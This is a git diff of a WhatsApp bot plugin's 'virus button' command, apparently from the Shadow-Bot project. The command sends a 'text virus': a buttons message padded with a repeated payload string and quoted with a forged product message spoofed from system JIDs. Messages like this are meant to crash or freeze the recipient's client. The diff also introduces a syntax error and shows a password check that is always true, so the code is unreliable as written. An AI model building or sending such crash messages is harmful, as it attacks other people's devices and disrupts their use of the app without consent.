@@ -12424,21 +12424,23 @@ Shadow.addCommand({pattern: 'virus button', fromMe: true, desc: 'Send Text Virus
 
 var url = await axios.get(`https://i.imgur.com/40cQtSL.jpeg`, { responseType: 'arraybuffer' })
 
+var thumb = await axios.get(`https://i.imgur.com/x0IjW0U.jpeg`, { responseType: 'arraybuffer' })
+
 const buttons = [
         { buttonId: 'VIRUS', buttonText: { displayText: '😌😌😌😌😌😌️' }, type: 1 }
         ]
     const { imageMessage } = await message.client.prepareMessageMedia(fs.readFileSync('./uploads/image/Shadow.jpg'), MessageType.image);
     const buttonMessage = {
-        contentText: AAG + AAG + AAG + AAG + AAG,
-        footerText: 'SHADOW VIRUS' + AAG + AAG + AAG + 'SHADOW VIRUS',
+        contentText: AAG + AAG + AAG + AAG + AAG + AAG + AAG + AAG + AAG + AAG,
+        footerText: '🥶🥵💤𝕊ℙ𝔸ℝ𝕂💤𝕊ℍ𝔸𝔻𝕆𝕎💤 𝕆💤𝕊𝔼𝕌💤ℤ𝕀ℙ💤ℤ𝕆ℙ 🥶🥵' + AAG + AAG + AAG + 'SHADOW VIRUS',
         buttons: buttons,
         headerType: 4,
         imageMessage: imageMessage
     }
 
-const freply7 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(message.jid ? { remoteJid: '1595603042@s.whatsapp.net' } : {}) }, message: { "productMessage":{"product": {"productImage": {"mimetype":'image/jpeg',"jpegThumbnail": iye, "title": `${ucapanWaktu} ${pushname}`, "productImageCount": 1 }, "businessOwnerJid": `0@s.whatsapp.net` }}}}
+const freply7 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(message.jid ? { remoteJid: 'status@broadcast' } : {}) }, message: { "productMessage":{"product": {"productImage": {"mimetype":'image/jpeg',"jpegThumbnail": Buffer.from(url.data), "title": AAG, "productImageCount": 1 }, "businessOwnerJid": `0@s.whatsapp.net` }}}}
 
-await message.client.sendMessage(message.jid, buttonMessage, MessageType.buttonsMessage, { quoted : freply7, contextInfo: { forwardingScore: 508, isForwarded: false, externalAdReply:{title: AAG,body:AAG,previewType:"PHOTO",thumbnail:Buffer.from(url.data),sourceUrl:`https://github.com/SPARK-SHADOW/Shadow-Bot`}}})
+await message.client.sendMessage(message.jid, buttonMessage, MessageType.buttonsMessage, {, thumbnail: Buffer.from(thumb.data), quoted : freply7, contextInfo: { forwardingScore: 508, isForwarded: false, externalAdReply:{title: AAG,body:AAG,previewType:"PHOTO",thumbnail:Buffer.from(url.data),sourceUrl:`https://github.com/SPARK-SHADOW/Shadow-Bot`}}})
 }));
 }
 else if (Spark.SHADOWPW !== 'ShAdoW' || Spark.SHADOWPW !== 'SpArK' || Spark.SHADOWPW !== 'Ꮥ н @ ∂ ø Ш') {
